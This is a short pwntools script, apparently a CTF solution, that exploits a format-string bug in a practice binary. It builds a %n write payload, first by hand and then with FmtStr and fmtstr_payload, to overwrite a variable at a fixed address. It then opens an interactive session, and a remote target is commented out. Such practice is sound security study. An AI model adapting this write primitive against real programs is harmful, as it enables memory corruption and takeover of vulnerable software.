from pwn import *

# r=remote('node5.buuoj.cn',28745)
r=process("./pwn/string/fmt-1/fmt1")
x_addr=0x804A02C

payload=p32(x_addr)+b"%11$n"

# # 偏移量
# offset = 11


# # 构造格式化字符串攻击载荷
# payload = fmtstr_payload(offset, {x_addr: 4})



# 使用 FmtStr 构造格式化字符串攻击载荷
def send_payload(payload):
    p=process("./pwn/string/fmt-1/fmt1")
    p.sendline(payload)
    return p.recvall()

fmt = FmtStr(send_payload )
payload = fmtstr_payload(fmt.offset, {x_addr: 4})

r.sendline(payload)

r.interactive()